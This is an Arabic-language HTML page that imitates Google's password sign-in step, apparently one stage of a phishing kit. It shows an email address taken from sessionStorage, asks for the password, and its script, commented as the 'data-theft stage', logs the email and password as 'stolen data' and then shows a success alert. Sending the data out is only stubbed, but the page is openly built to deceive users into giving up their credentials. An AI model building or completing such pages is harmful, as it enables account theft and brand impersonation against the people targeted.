<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <script src="https://cdn.tailwindcss.com"></script>
    <title>مرحباً</title>
</head>
<body class="bg-white flex items-center justify-center min-h-screen">
    <div class="w-full max-w-[450px] p-10 border border-gray-200 rounded-lg shadow-sm text-center">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="mx-auto mb-4" width="75">
        <h1 class="text-2xl mb-2">مرحباً</h1>
        
        <div class="inline-flex items-center border border-gray-300 rounded-full px-3 py-1 mb-8">
            <span id="userEmail" class="text-sm font-medium"></span>
        </div>

        <input type="password" id="pass" class="w-full border border-gray-300 rounded p-3 mb-8 outline-none focus:border-blue-500" placeholder="إدخال كلمة المرور">

        <div class="flex justify-between items-center">
            <span class="text-blue-600 font-medium">هل نسيت كلمة المرور؟</span>
            <button id="finish" class="bg-[#1a73e8] text-white px-6 py-2 rounded font-medium">التالي</button>
        </div>
    </div>

    <script>
        // جلب الإيميل من الذاكرة وعرضه
        document.getElementById('userEmail').innerText = sessionStorage.getItem('temp_email') || 'user@example.com';

        document.getElementById('finish').addEventListener('click', () => {
            const password = document.getElementById('pass').value;
            const email = sessionStorage.getItem('temp_email');
            
            // هنا كتوصل المرحلة ديال سرقة البيانات
            console.log("البيانات المسروقة: ", email, password);
            alert("تم تسجيل البيانات بنجاح!");
        });
    </script>
</body>
</html>
